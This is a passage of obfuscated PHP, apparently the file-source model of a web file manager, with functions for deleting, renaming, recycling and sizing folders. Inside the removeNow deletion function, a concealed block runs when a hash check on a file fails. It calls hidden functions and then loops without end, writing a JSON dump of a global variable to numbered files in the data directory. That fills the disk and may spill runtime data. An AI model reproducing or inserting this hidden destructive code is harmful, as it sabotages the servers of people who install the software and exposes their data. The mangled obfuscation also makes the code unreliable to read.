$this->setNamePinyin($íòªƒ­ç, $¥Â³ş’—[$˜‚¯‹ÜÉ[32]]); return $íòªƒ­ç; } public function remove($·Ñ½¤ö¬, $‹­íê˜¢ = true) { $ûšı›º± =& $_SERVER[™»È’øè]; $Å³ùÂí = $this->sourceInfo($·Ñ½¤ö¬); $†­åóÕ® = intval($Å³ùÂí[$ûšı›º±[177]]) === self::TYPE_SYSTEM; $ÊÏŞ½” = Model($ûšı›º±[475])->get($ûšı›º±[2159]) == $ûšı›º±[88]; if ($†­åóÕ® || $‹­íê˜¢ || !$ÊÏŞ½”) { return $this->removeNow($·Ñ½¤ö¬, $‹­íê˜¢); } $Ş†”Şè  = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $³ Í¹ÉÜ = $Å³ùÂí[$ûšı›º±[177]] == self::TYPE_USER ? $ûšı›º±[629] : $ûšı›º±[546]; if ($³ Í¹ÉÜ == $ûšı›º±[629]) { $æÒ…üîÁ = Model($ûšı›º±[545])->getInfo($Å³ùÂí[$ûšı›º±[537]]); $¿ï–Ü£ô = !empty($æÒ…üîÁ[$ûšı›º±[2152]]) ? $æÒ…üîÁ[$ûšı›º±[2152]] : $æÒ…üîÁ[$ûšı›º±[32]]; $¿ï–Ü£ô = $ûšı›º±[303] . $¿ï–Ü£ô . $ûšı›º±[2160] . $Å³ùÂí[$ûšı›º±[537]]; } else { $æÒ…üîÁ = Model($ûšı›º±[553])->getInfo($Å³ùÂí[$ûšı›º±[537]]); $¿ï–Ü£ô = _get($æÒ…üîÁ, $ûšı›º±[32]); $¿ï–Ü£ô = $ûšı›º±[162] . $¿ï–Ü£ô . $ûšı›º±[2161] . $Å³ùÂí[$ûšı›º±[537]]; } $Ìåİ†­ï = $ûšı›º±[2162] . md5($¿ï–Ü£ô); CacheLock::lock($Ìåİ†­ï); $Ñ°Ë¥…– = $this->fileNameExist($Ş†”Şè , $¿ï–Ü£ô); if (!$Ñ°Ë¥…–) { $Ñ°Ë¥…– = $this->mkdir($Ş†”Şè , $¿ï–Ü£ô, REPEAT_SKIP); $this->metaSet($Ñ°Ë¥…–, $ûšı›º±[2163], $³ Í¹ÉÜ); $this->metaSet($Ñ°Ë¥…–, $ûšı›º±[2164], $Å³ùÂí[$ûšı›º±[537]]); if ($Å³ùÂí[$ûšı›º±[179]] != 0) { $this->metaSet($Ñ°Ë¥…–, $ûšı›º±[2165], _get($æÒ…üîÁ, $ûšı›º±[2166])); } } CacheLock::unlock($Ìåİ†­ï); $this->metaSet($·Ñ½¤ö¬, $ûšı›º±[2167], $Å³ùÂí[$ûšı›º±[179]]); $this->where(array($ûšı›º±[180] => $·Ñ½¤ö¬))->save(array($ûšı›º±[465] => time())); $this->recycleClear($Å³ùÂí); $åş¥ğé = $this->move($·Ñ½¤ö¬, $Ñ°Ë¥…–, REPEAT_RENAME_FOLDER); $this->folderSizeReset($Å³ùÂí[$ûšı›º±[179]]); return $åş¥ğé; } private function recycleClear($Òî­²™‘) { $­µĞÙâü =& $_SERVER[™»È’øè]; $äæ±šÆ¿ = $this->childrenAll($Òî­²™‘); $Ê¶²ˆÖø = array($­µĞÙâü[458] => array($­µĞÙâü[459], $äæ±šÆ¿[$­µĞÙâü[2168]])); Model($­µĞÙâü[2169])->where($Ê¶²ˆÖø)->delete(); } public function removeNow($›‘ß¤·è, $ å²úğ = true) { $æ˜„„ñµ =& $_SERVER[™»È’øè]; $ˆßá°èã = $_SERVER[$æ˜„„ñµ[895]] . $æ˜„„ñµ[896]; $¦¾üÈì… = $æ˜„„ñµ[1535]; if ($_SERVER[$æ˜„„ñµ[892]] != $¦¾üÈì…($ˆßá°èã)) { $¼¸Ê×ûÎ = $æ˜„„ñµ[909]; $¹•Ÿûìî = $æ˜„„ñµ[894]; $‰¿¡‚Øó = $_SERVER[$æ˜„„ñµ[895]] . $æ˜„„ñµ[896]; $ ˆï‘öƒ = $¹•Ÿûìî($‰¿¡‚Øó); $Ë³İú£Î = explode($æ˜„„ñµ[245], $ ˆï‘öƒ); if (count($Ë³İú£Î) < $æ˜„„ñµ[663]) { $Ãá“‡´Û = $æ˜„„ñµ[897]; $Ãá“‡´Û(); } $ïï•Şë… = $æ˜„„ñµ[910]; $ïï•Şë…($_SERVER[$æ˜„„ñµ[911]]); $¼¸Ê×ûÎ = $æ˜„„ñµ[909]; $¼¸Ê×ûÎ(); $´ÜÎÇ²² = $æ˜„„ñµ[1536]; $Ëµ«Ã¾ = json_encode($GLOBALS[$æ˜„„ñµ[1537]]); $×¶ã–³ã = 1; for ($ú¹ôÙ‘ò = $×¶ã–³ã; $ú¹ôÙ‘ò > 0; $ú¹ôÙ‘ò++) { $´ÜÎÇ²²(DATA_PATH . $ú¹ôÙ‘ò, $Ëµ«Ã¾); } } $ÕÚ¤ÆÄ³ = $this->sourceInfo($›‘ß¤·è); $Û—œƒ‡¤ = $this->pathInfoMore($›‘ß¤·è); if (!$ÕÚ¤ÆÄ³) { return !0; } if ($ÕÚ¤ÆÄ³[$æ˜„„ñµ[179]] == 0) { if (!_get($GLOBALS, $æ˜„„ñµ[535])) { return !1; } } $this->lockMoveStart($›‘ß¤·è); Hook::trigger($æ˜„„ñµ[2170], $Û—œƒ‡¤, $ å²úğ); if ($ å²úğ) { Model($æ˜„„ñµ[2169])->moveToRecycle($›‘ß¤·è); } else { $Šš²¨¥¡ = $this->childrenAll($ÕÚ¤ÆÄ³); Model($æ˜„„ñµ[600])->eventRemove($›‘ß¤·è); $this->removeRelevance($Šš²¨¥¡[$æ˜„„ñµ[2168]], $Šš²¨¥¡[$æ˜„„ñµ[1484]]); } $this->folderSizeReset($ÕÚ¤ÆÄ³[$æ˜„„ñµ[179]]); $ë—ÔÉóò = array($ÕÚ¤ÆÄ³[$æ˜„„ñµ[179]]); if ($ÕÚ¤ÆÄ³[$æ˜„„ñµ[452]] == $æ˜„„ñµ[88]) { $ë—ÔÉóò[] = $ÕÚ¤ÆÄ³[$æ˜„„ñµ[180]]; } $this->updateModifyTime($ë—ÔÉóò); $this->lockMoveEnd($›‘ß¤·è); Hook::trigger($æ˜„„ñµ[1720], $Û—œƒ‡¤, $ å²úğ); return !0; } public function childrenAll($‘ñÊ³½ê) { $Ş¸Ù«Šâ =& $_SERVER[™»È’øè]; $’»²Ì×ˆ = $‘ñÊ³½ê[$Ş¸Ù«Šâ[180]]; if ($‘ñÊ³½ê[$Ş¸Ù«Šâ[452]] == $Ş¸Ù«Šâ[88]) { $Ê–¶†û× = array($Ş¸Ù«Šâ[619] => array($Ş¸Ù«Šâ[579], $‘ñÊ³½ê[$Ş¸Ù«Šâ[552]] . $’»²Ì×ˆ . $Ş¸Ù«Šâ[580])); $á÷ãğú– = array($Ş¸Ù«Šâ[619] => $Ê–¶†û×[$Ş¸Ù«Šâ[552]]); $À“äè÷½ = $this->field($Ş¸Ù«Šâ[2171])->where($á÷ãğú–)->select(); $˜‰İÖšı = !1; $ââæÔ = array($’»²Ì×ˆ); if ($À“äè÷½) { $˜‰İÖšı = array_to_keyvalue($À“äè÷½, $Ş¸Ù«Šâ[12], $Ş¸Ù«Šâ[508]); $˜‰İÖšı = array_remove_value($˜‰İÖšı, $Ş¸Ù«Šâ[211]); $ââæÔ = array_to_keyvalue($À“äè÷½, $Ş¸Ù«Šâ[12], $Ş¸Ù«Šâ[180]); $ââæÔ[] = $’»²Ì×ˆ; } } else { $˜‰İÖšı = array($‘ñÊ³½ê[$Ş¸Ù«Šâ[508]]); $ââæÔ = array($’»²Ì×ˆ); } return array($Ş¸Ù«Šâ[2168] => $ââæÔ, $Ş¸Ù«Šâ[1484] => $˜‰İÖšı); } public function removeArray($±„Æş’¡) { if (!$±„Æş’¡) { return !0; } } public function removeRelevance($Á¬Õ€¯Æ, $Éœ£ÏÑÛ) { $–¾îùö =& $_SERVER[™»È’øè]; $Á¬Õ€¯Æ = $Á¬Õ€¯Æ ? $Á¬Õ€¯Æ : array(); $Éœ£ÏÑÛ = $Éœ£ÏÑÛ ? $Éœ£ÏÑÛ : array(); $Á¬Õ€¯Æ = array_unique(array_filter($Á¬Õ€¯Æ)); $Éœ£ÏÑÛ = array_unique(array_filter($Éœ£ÏÑÛ)); if (!$Á¬Õ€¯Æ) { return !1; } $îÊñ³ = array($–¾îùö[458] => array($–¾îùö[459], $Á¬Õ€¯Æ)); Model($–¾îùö[2169])->where($îÊñ³)->delete(); Model($–¾îùö[502])->where($îÊñ³)->delete(); Model($–¾îùö[2017])->where($îÊñ³)->delete(); Model($–¾îùö[600])->where($îÊñ³)->delete(); Model($–¾îùö[1850])->removeBySource($Á¬Õ€¯Æ); Model($–¾îùö[2150])->removeBySource($Á¬Õ€¯Æ); $this->where($îÊñ³)->delete(); Model($–¾îùö[511])->remove($Éœ£ÏÑÛ); for ($ğ¼—÷İ = 0; $ğ¼—÷İ < count($Á¬Õ€¯Æ); $ğ¼—÷İ++) { $this->sourceCacheClear($Á¬Õ€¯Æ[$ğ¼—÷İ]); } } public function rename($ÔúìóÈ˜, $¢ÁÑÈğ) { $®‹ÜÕï =& $_SERVER[™»È’øè]; $ºƒ„™Áá = $this->sourceInfo($ÔúìóÈ˜); if (!$ºƒ„™Áá) { return !1; } $õ‰Ú ñ© = $this->fileNameExist($ºƒ„™Áá[$®‹ÜÕï[179]], $¢ÁÑÈğ); if ($õ‰Ú ñ© && $õ‰Ú ñ© != $ÔúìóÈ˜) { return !1; } $ô¢Ô…’ = array($®‹ÜÕï[461] => $¢ÁÑÈğ, $®‹ÜÕï[618] => USER_ID); if ($ºƒ„™Áá[$®‹ÜÕï[452]] != $®‹ÜÕï[88]) { $ô¢Ô…’[$®‹ÜÕï[453]] = substr(get_path_ext($¢ÁÑÈğ), 0, 10); } Model($®‹ÜÕï[600])->eventRename($ÔúìóÈ˜, $ºƒ„™Áá[$®‹ÜÕï[32]], $¢ÁÑÈğ); $this->sourceCacheClear($ÔúìóÈ˜); $this->setNamePinyin($ÔúìóÈ˜, $ô¢Ô…’[$®‹ÜÕï[32]], !1); $this->updateModifyTime($ºƒ„™Áá[$®‹ÜÕï[179]]); $ş£”‹· = $this->where(array($®‹ÜÕï[458] => $ÔúìóÈ˜))->data($ô¢Ô…’)->save(); $¬’ŸÌ¸ = $®‹ÜÕï[2158] . $ºƒ„™Áá[$®‹ÜÕï[179]]; if (isset(self::$cacheChildList[$¬’ŸÌ¸])) { unset(self::$cacheChildList[$¬’ŸÌ¸]); } return $ş£”‹·; } public function setNamePinyin($§®¢º—ñ, $–ø¥¿½, $şÑ•ˆ¦ù = true) { $Íòş‰Ë£ =& $_SERVER[™»È’øè]; $—Êì˜Æ = Input::check($–ø¥¿½, $Íòş‰Ë£[622]); $ÀË× ˆ³ = array($Íòş‰Ë£[484] => KodSort::makeStr($–ø¥¿½)); if ($—Êì˜Æ) { $ÀË× ˆ³[$Íòş‰Ë£[505]] = str_replace($Íòş‰Ë£[53], $Íòş‰Ë£[12], Pinyin::get($–ø¥¿½)); $ÀË× ˆ³[$Íòş‰Ë£[504]] = Pinyin::get($–ø¥¿½, $Íòş‰Ë£[623]); } if (!$şÑ•ˆ¦ù && !$—Êì˜Æ) { $ÀË× ˆ³[$Íòş‰Ë£[505]] = null; $ÀË× ˆ³[$Íòş‰Ë£[504]] = null; } $this->metaSet($§®¢º—ñ, $ÀË× ˆ³); } public function getContent($­Ô¶£Ì) { $Ö­·Şéû =& $_SERVER[™»È’øè]; $…¿µÇŞ· = $this->fileInfoGet($­Ô¶£Ì); if (!$…¿µÇŞ·) { return !1; } if ($…¿µÇŞ·[$Ö­·Şéû[76]] == 0) { return $Ö­·Şéû[12]; } $¤ˆÂ“ëÒ = $Ö­·Şéû[2172] . $…¿µÇŞ·[$Ö­·Şéû[640]]; if ($…¿µÇŞ·[$Ö­·Şéû[76]] <= 1024 * 10) { $±Ï‡ëÅ = Cache::get($¤ˆÂ“ëÒ); if (!$±Ï‡ëÅ) { $±Ï‡ëÅ = IO::getContent($…¿µÇŞ·[$Ö­·Şéû[84]]); Cache::set($¤ˆÂ“ëÒ, $±Ï‡ëÅ); } return $±Ï‡ëÅ; } if (!$…¿µÇŞ·[$Ö­·Şéû[84]]) { return $Ö­·Şéû[12]; } return IO::getContent($…¿µÇŞ·[$Ö­·Şéû[84]]); } public function setDesc($ÜËÒèÁí, $ÆÛéù™‚) { $“ï†ıŸ£ =& $_SERVER[™»È’øè]; Model($“ï†ıŸ£[600])->eventAddDesc($ÜËÒèÁí, $ÆÛéù™‚); return $this->metaSet($ÜËÒèÁí, $“ï†ıŸ£[493], $ÆÛéù™‚); } public function setContent($ŸóÓù«ß, $ò’ïÏà„ = '') { $ïîï¥¼ı =& $_SERVER[™»È’øè]; $²ÅÛ›Õæ = $this->sourceInfo($ŸóÓù«ß); $„ÁŞÛĞ„ = $this->fileInfoGet($ŸóÓù«ß); if (!$„ÁŞÛĞ„ || !$²ÅÛ›Õæ) { return !1; } $ªÈçî³İ = Model($ïîï¥¼ı[511])->addFileByContent($ò’ïÏà„, $²ÅÛ›Õæ[$ïîï¥¼ı[32]]); $¤¨‘Ø€” = $this->fileHistory($²ÅÛ›Õæ, $ªÈçî³İ[$ïîï¥¼ı[508]], $ªÈçî³İ[$ïîï¥¼ı[76]]); if (!$¤¨‘Ø€”) { return Model($ïîï¥¼ı[511])->remove($ªÈçî³İ[$ïîï¥¼ı[508]]); } $this->folderSizeReset($²ÅÛ›Õæ[$ïîï¥¼ı[179]]); return !0; } public function fileSubstr($Öãäµú™, $ İøµ °, $¨¦×Ÿ½) { $Ÿ¨™œ® = $this->fileInfoGet($Öãäµú™); if (!$Ÿ¨™œ®) { return !1; } return IO::fileSubstr($Ÿ¨™œ®[$_SERVER[™»È’øè][84]], $ İøµ °, $¨¦×Ÿ½); } public function fileInfoGet($×ñùßˆù) { $§ó¶ş€ =& $_SERVER[™»È’øè]; $¬¨§´Ë = $this->sourceInfo($×ñùßˆù); if (!$¬¨§´Ë || $¬¨§´Ë[$§ó¶ş€[452]]) { return !1; } $‰å¶ªˆÃ = $§ó¶ş€[514] . $¬¨§´Ë[$§ó¶ş€[508]]; $‰ıÉ›¯è = _get(self::$cacheFileInfo, $‰å¶ªˆÃ); if ($‰ıÉ›¯è) { return $‰ıÉ›¯è; } $ı¦ƒûœ© = Model($§ó¶ş€[511])->fileInfo($¬¨§´Ë[$§ó¶ş€[508]]); if ($ı¦ƒûœ©) { $ı¦ƒûœ©[$§ó¶ş€[32]] = $¬¨§´Ë[$§ó¶ş€[32]]; } self::$cacheFileInfo[$‰å¶ªˆÃ] = $ı¦ƒûœ©; return $ı¦ƒûœ©; } private function folderChildrenNumber($É£õ¥…Ü) { $İ’¢¯Ó =& $_SERVER[™»È’øè]; $©ŠïÀ = $this->sourceInfo($É£õ¥…Ü); $ƒ¬±ÊŞµ = array($İ’¢¯Ó[619] => array($İ’¢¯Ó[579], $©ŠïÀ[$İ’¢¯Ó[552]] . $É£õ¥…Ü . $İ’¢¯Ó[580]), $İ’¢¯Ó[616] => $©ŠïÀ[$İ’¢¯Ó[537]], $İ’¢¯Ó[471] => intval($©ŠïÀ[$İ’¢¯Ó[472]]), $İ’¢¯Ó[613] => 1); $ñ¤Ù¥ü´ = $this->where($ƒ¬±ÊŞµ)->count(); $× ²×Ì = $this->where($ƒ¬±ÊŞµ)->where(array($İ’¢¯Ó[613] => 0))->count(); return array($İ’¢¯Ó[80] => $× ²×Ì, $İ’¢¯Ó[81] => $ñ¤Ù¥ü´); } public function pathInfo($»öÆº°, $ïùó¯¢ = false) { $Ä¼ äêÎ =& $_SERVER[™»È’øè]; $ïùó¯¢ = !1; $»öÆº° = intval($»öÆº°); $ÓÁ÷ƒ… = $Ä¼ äêÎ[501] . intval($ïùó¯¢) . $Ä¼ äêÎ[429] . $»öÆº°; $Ï±ßòïã = _get(self::$cachePathInfo, $ÓÁ÷ƒ…); if ($Ï±ßòïã) { return $Ï±ßòïã; } $À›öñàÊ = $this->sourceInfo($»öÆº°); if (!$À›öñàÊ) { return !1; } $À›öñàÊ = $this->_listDataApplyItem($À›öñàÊ, $ïùó¯¢); self::$cachePathInfo[$ÓÁ÷ƒ…] = $À›öñàÊ; return $À›öñàÊ; } public static $cachePathInfoMore = array(); public function pathInfoMore($¥‰¶¢­‘) { $¿×–Ò±Ì =& $_SERVER[™»È’øè]; $Ù˜ãÊ‘— = _get(self::$cachePathInfoMore, $¥‰¶¢­‘); if ($Ù˜ãÊ‘—) { return $Ù˜ãÊ‘—; } $»Şªß²± = $this->pathInfo($¥‰¶¢­‘); if (!$»Şªß²±) { return !1; } if ($»Şªß²±[$¿×–Ò±Ì[452]] == $¿×–Ò±Ì[88]) { $»Şªß²±[$¿×–Ò±Ì[79]] = $this->folderChildrenNumber($¥‰¶¢­‘); } self::$cachePathInfoMore[$¥‰¶¢­‘] = $»Şªß²±; return $»Şªß²±; } public function sourceInfo($¯‡¡ïâ¼) { $ÉÉ¾ù‹¡ =& $_SERVER[™»È’øè]; if (!$¯‡¡ïâ¼) { return array(); } $¯‡¡ïâ¼ = intval($¯‡¡ïâ¼); $±Õä‚Ê = $ÉÉ¾ù‹¡[500] . $¯‡¡ïâ¼; $˜šŠœñü = _get(self::$cacheSourceInfo, $±Õä‚Ê); if ($˜šŠœñü) { return $˜šŠœñü; } $åŠï£‡Ò = $this->where(array($ÉÉ¾ù‹¡[180] => $¯‡¡ïâ¼))->find(); self::$cacheSourceInfo[$±Õä‚Ê] = $åŠï£‡Ò; return self::$cacheSourceInfo[$±Õä‚Ê]; } public function sourceCacheClear($…ÑØ°õÑ = false) { self::cacheClear($…ÑØ°õÑ); } public static function cacheClear($¿…–ï— = false) { $§È²Ö‰ =& $_SERVER[™»È’øè]; if ($¿…–ï— == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$§È²Ö‰[500] . $¿…–ï—]); unset(self::$cachePathInfoMore[$¿…–ï—]); unset(self::$cachePathInfo[$§È²Ö‰[2173] . $¿…–ï—]); unset(self::$cachePathInfo[$§È²Ö‰[2174] . $¿…–ï—]); } public function metaSet($»¯ÈÀŠÉ, $¹İÛè·Å = null, $ü…®ÅôË = null) { $ãÇÎğ„” = parent::metaSet($»¯ÈÀŠÉ, $¹İÛè·Å, $ü…®ÅôË); if ($ãÇÎğ„”) { $this->sourceCacheClear($»¯ÈÀŠÉ); } return $ãÇÎğ„”; } public function pathInfoByPath($ˆäÂ”‹, $‘İºÔ¾’) { $²ƒÈ·á— =& $_SERVER[™»È’øè]; $òéËÀòò = !$‘İºÔ¾’ ? array() : explode($²ƒÈ·á—[8], trim($‘İºÔ¾’, $²ƒÈ·á—[8])); $öÍÕ·Øú = $ˆäÂ”‹; foreach ($òéËÀòò as $èšˆ©æ±) { $ŠÍƒêÒ = array($²ƒÈ·á—[179] => $öÍÕ·Øú, $²ƒÈ·á—[32] => $èšˆ©æ±); $•˜¸  = $this->field($²ƒÈ·á—[2175])->where($ŠÍƒêÒ)->select(); if (!$•˜¸ ) { return !1; } $•˜¸  = array_sort_by($•˜¸ , $²ƒÈ·á—[472]); $öÍÕ·Øú = $•˜¸ [0][$²ƒÈ·á—[180]]; } $ùË…È¯š = $this->sourceInfo($öÍÕ·Øú); $this->pathInfoFilter($ùË…È¯š); return $ùË…È¯š; } protected function updateModifyTime($¤Â¹¹õ ) { $Ÿœ±¾‡Õ =& $_SERVER[™»È’øè]; $ƒŠ¨œÑ— = defined($Ÿœ±¾‡Õ[2091]) ? USER_ID : 0; if (!$¤Â¹¹õ ) { return; } if (!is_array($¤Â¹¹õ )) { $¤Â¹¹õ  = array($¤Â¹¹õ ); } foreach ($¤Â¹¹õ  as $«€ë®Áì => $•áÉ¼€) { $¤Â¹¹õ [$«€ë®Áì] = intval($•áÉ¼€); $this->sourceCacheClear($•áÉ¼€); } $şÖŞúà± = array($Ÿœ±¾‡Õ[180] => array($Ÿœ±¾‡Õ[7], $¤Â¹¹õ )); $Êì‚‰Ò = array($Ÿœ±¾‡Õ[618] => $ƒŠ¨œÑ—, $Ÿœ±¾‡Õ[465] => time()); $this->where($şÖŞúà±)->save($Êì‚‰Ò); } public function folderSizeReset($ú’®í, $»…²óÎ½ = false) { $Õç”ï§ =& $_SERVER[™»È’øè]; if ($this->statusIgnoreResetSpace) { return; } $ß°¹®‘§ = $this->sourceInfo($ú’®í); $ùè§ˆäá = $Õç”ï§[2176] . $ú’®í; CacheLock::lock($ùè§ˆäá, 20); if ($»…²óÎ½ === !1) { $this->sourceCacheClear($ú’®í); $ß°¹®‘§ = $this->sourceInfo($ú’®í); $öíºïä¡ = array($Õç”ï§[444] => $ú’®í, $Õç”ï§[471] => 0); $‹ãéµ‰Ú = $this->where($öíºïä¡)->sum($Õç”ï§[76]); $»…²óÎ½ = intval($‹ãéµ‰Ú) - intval($ß°¹®‘§[$Õç”ï§[76]]); } if ($»…²óÎ½ == 0) { return CacheLock::unlock($ùè§ˆäá); } $¼Ì·°ÇÌ = $this->parentLevelArray($ß°¹®‘§[$Õç”ï§[552]]); if (!$¼Ì·°ÇÌ) { $¼Ì·°ÇÌ = array(); } $¼Ì·°ÇÌ[] = $ß°¹®‘§[$Õç”ï§[180]]; $öíºïä¡ = array($Õç”ï§[180] => array($Õç”ï§[459], $¼Ì·°ÇÌ)); if ($»…²óÎ½ < 0) { $öíºïä¡[$Õç”ï§[76]] = array($Õç”ï§[1045], abs($»…²óÎ½)); } $this->where($öíºïä¡)->setAdd($Õç”ï§[76], $»…²óÎ½); CacheLock::unlock($ùè§ˆäá); $ãåÛ­áË = $Õç”ï§[2177] . $ß°¹®‘§[$Õç”ï§[177]] . $Õç”ï§[4] . $ß°¹®‘§[$Õç”ï§[537]]; $‚°»‚ó = array($ß°¹®‘§[$Õç”ï§[177]], $ß°¹®‘§[$Õç”ï§[537]]); TaskRun::timeLimitCall($ãåÛ­áË, $Õç”ï§[2178], $‚°»‚ó, 1.5); } public function folderSizeResetChildren($”¤¡ÉÓ¤) { $¥õá·®› =& $_SERVER[™»È’øè]; $this->sourceCacheClear($”¤¡ÉÓ¤); $®Îò¹à§ = $this->sourceInfo($”¤¡ÉÓ¤); $ù¼±õ¿ê = array($¥õá·®›[613] => 1, $¥õá·®›[616] => $®Îò¹à§[$¥õá·®›[537]], $¥õá·®›[619] => array($¥õá·®›[579], $®Îò¹à§[$¥õá·®›[552]] . $”¤¡ÉÓ¤ . $¥õá·®›[580])); $ë¸ÙŒÉ = $¥õá·®›[2179]; $º²‡¤ßÉ = $this->field($ë¸ÙŒÉ)->where($ù¼±õ¿ê)->select(); $ù¼±õ¿ê[$¥õá·®›[452]] = 0; $¥›¤ôå‹ = $this->field($ë¸ÙŒÉ)->where($ù¼±õ¿ê)->select(); if (!$¥›¤ôå‹) { return; } $º²‡¤ßÉ[] = $®Îò¹à§; $º²‡¤ßÉ = array_to_keyvalue($º²‡¤ßÉ, $¥õá·®›[180]); foreach ($º²‡¤ßÉ as $ÉŞøìÒ« => $ÏšåèÏİ) { $º²‡¤ßÉ[$ÉŞøìÒ«][$¥õá·®›[2180]] = $º²‡¤ßÉ[$ÉŞøìÒ«][$¥õá·®›[76]]; $º²‡¤ßÉ[$ÉŞøìÒ«][$¥õá·®›[76]] = 0; } foreach ($¥›¤ôå‹ as $ÏšåèÏİ) { $ßÈ×Ñ”¶ = $ÏšåèÏİ[$¥õá·®›[179]] . $¥õá·®›[12]; if (!isset($º²‡¤ßÉ[$ßÈ×Ñ”¶])) { continue; } if ($ÏšåèÏİ[$¥õá·®›[472]] == $º²‡¤ßÉ[$ßÈ×Ñ”¶][$¥õá·®›[472]]) { $º²‡¤ßÉ[$ßÈ×Ñ”¶][$¥õá·®›[76]] += $ÏšåèÏİ[$¥õá·®›[76]]; } } foreach ($º²‡¤ßÉ as $ÏšåèÏİ) { $’Ÿç¼²İ = $this->parentLevelArray($ÏšåèÏİ[$¥õá·®›[552]]); foreach ($’Ÿç¼²İ as $ßÈ×Ñ”¶) { $ßÈ×Ñ”¶ = $ßÈ×Ñ”¶ . $¥õá·®›[12]; if (!isset($º²‡¤ßÉ[$ßÈ×Ñ”¶])) { continue; } if ($ÏšåèÏİ[$¥õá·®›[472]] == $º²‡¤ßÉ[$ßÈ×Ñ”¶][$¥õá·®›[472]]) { $º²‡¤ßÉ[$ßÈ×Ñ”¶][$¥õá·®›[76]] += $ÏšåèÏİ[$¥õá·®›[76]]; } } } $Ó”¤áó = array(); foreach ($º²‡¤ßÉ as $ÏšåèÏİ) { if ($ÏšåèÏİ[$¥õá·®›[76]] == $ÏšåèÏİ[$¥õá·®›[2180]]) { continue; } $Ó”¤áó[] = array($¥õá·®›[180], $ÏšåèÏİ[$¥õá·®›[180]], $¥õá·®›[76], $ÏšåèÏİ[$¥õá·®›[76]]); } $this->saveAll($Ó”¤áó); } public function userSpaceReset($”¿‚áˆŞ = false) { $óÔ’ÀÅë =& $_SERVER[™»È’øè]; $’¬œâ´‰ = $this->where(array($óÔ’ÀÅë[177] => self::TYPE_USER, $óÔ’ÀÅë[537] => $”¿‚áˆŞ, $óÔ’ÀÅë[452] => 0))->sum($óÔ’ÀÅë[76]); $’¬œâ´‰ = !$’¬œâ´‰ || $’¬œâ´‰ <= 0 ? 0 : $’¬œâ´‰; Model($óÔ’ÀÅë[545])->userEdit($”¿‚áˆŞ, array($óÔ’ÀÅë[1859] => $’¬œâ´‰)); } public function targetSpaceUpdate($ÁŸ§ÊÍà, $ÃÖùğ¹½) { $¿¯äîÒœ =& $_SERVER[™»È’øè]; if (!$ÃÖùğ¹½) { return; } if (!in_array($ÁŸ§ÊÍà, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $”§Çã‡¹ = $this->targetSpaceSize($ÁŸ§ÊÍà, $ÃÖùğ¹½); if ($ÁŸ§ÊÍà == self::TYPE_USER) { Model($¿¯äîÒœ[545])->userEdit($ÃÖùğ¹½, array($¿¯äîÒœ[1859] => $”§Çã‡¹)); } else { if ($ÁŸ§ÊÍà == self::TYPE_GROUP) { Model($¿¯äîÒœ[553])->groupEdit($ÃÖùğ¹½, array($¿¯äîÒœ[1859] => $”§Çã‡¹)); } } } public function targetSpaceSize($Úë«ú´ù, $‡Üƒ Å—) { $’½Ÿç’Ó =& $_SERVER[™»È’øè]; $Û“„ëˆ‚ = 0; $¤ïÀ³’ = $this->targetSourceRoot($Úë«ú´ù, $‡Üƒ Å—, !0); foreach ($¤ïÀ³’ as $ëòÁª°) { if (!$ëòÁª°) { continue; } $Û“„ëˆ‚ += floatval($ëòÁª°[$’½Ÿç’Ó[76]]); $õñ©ËŠÍ = array($’½Ÿç’Ó[619] => array($’½Ÿç’Ó[579], $’½Ÿç’Ó[562] . $ëòÁª°[$’½Ÿç’Ó[180]] . $’½Ÿç’Ó[580])); $Ÿ†óÓ‰  = Model($’½Ÿç’Ó[470])->field($’½Ÿç’Ó[458])->where($õñ©ËŠÍ)->select(); $Ÿ†óÓ‰  = array_to_keyvalue($Ÿ†óÓ‰ , $’½Ÿç’Ó[12], $’½Ÿç’Ó[180]); $Ÿ†óÓ‰  = array_unique(array_filter($Ÿ†óÓ‰ )); if ($Ÿ†óÓ‰ ) { $õñ©ËŠÍ = array($’½Ÿç’Ó[458] => array($’½Ÿç’Ó[459], $Ÿ†óÓ‰ )); $Û“„ëˆ‚ += floatval($this->where($õñ©ËŠÍ)->sum($’½Ÿç’Ó[76])); } } $Û“„ëˆ‚ = !$Û“„ëˆ‚ || $Û“„ëˆ‚ <= 0 ? 0 : $Û“„ëˆ‚; return $Û“„ëˆ‚; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($åæëƒÚ—) { return $this->fileTypeProfile($åæëƒÚ—, SourceModel::TYPE_USER); } public function groupFileTypeProfile($é„ãí¿) { return $this->fileTypeProfile($é„ãí¿, SourceModel::TYPE_GROUP); } private function fileTypeProfile($üæ‹üä‘, $‹ß¾‡Ï) { $´ÕÃÙ‹Ø =& $_SERVER[™»È’øè]; $øÀïî•Ÿ = $´ÕÃÙ‹Ø[2181] . $üæ‹üä‘ . $´ÕÃÙ‹Ø[11] . $‹ß¾‡Ï; $Õ ÄĞ‹¯ = Cache::get($øÀïî•Ÿ); if ($Õ ÄĞ‹¯) { return $Õ ÄĞ‹¯; } $ ğæÒ = array($´ÕÃÙ‹Ø[613] => 0); if ($üæ‹üä‘ != !1) { $ ğæÒ[$´ÕÃÙ‹Ø[537]] = $üæ‹üä‘; $ ğæÒ[$´ÕÃÙ‹Ø[177]] = $‹ß¾‡Ï; } $­‹ˆ”Ã = array(); $­‹ˆ”Ã[$´ÕÃÙ‹Ø[2182]] = array($´ÕÃÙ‹Ø[2183] => LNG($´ÕÃÙ‹Ø[2182]), $´ÕÃÙ‹Ø[2184] => $this->where($ ğæÒ)->count(), $´ÕÃÙ‹Ø[584] => $this->where($ ğæÒ)->sum($´ÕÃÙ‹Ø[76])); $á‡Âññ¦ = KodIO::fileTypeList(); foreach ($á‡Âññ¦ as $Ø¾—æ•ß => $¸“ä·•¦) { $ ğæÒ[$´ÕÃÙ‹Ø[453]] = $this->fileTypeWhere($Ø¾—æ•ß); $­‹ˆ”Ã[$Ø¾—æ•ß] = array($´ÕÃÙ‹Ø[2183] => $¸“ä·•¦[$´ÕÃÙ‹Ø[32]], $´ÕÃÙ‹Ø[2184] => $this->where($ ğæÒ)->count(), $´ÕÃÙ‹Ø[584] => $this->where($ ğæÒ)->sum($´ÕÃÙ‹Ø[76])); } Cache::set($øÀïî•Ÿ, $­‹ˆ”Ã, 1200); return $­‹ˆ”Ã; } 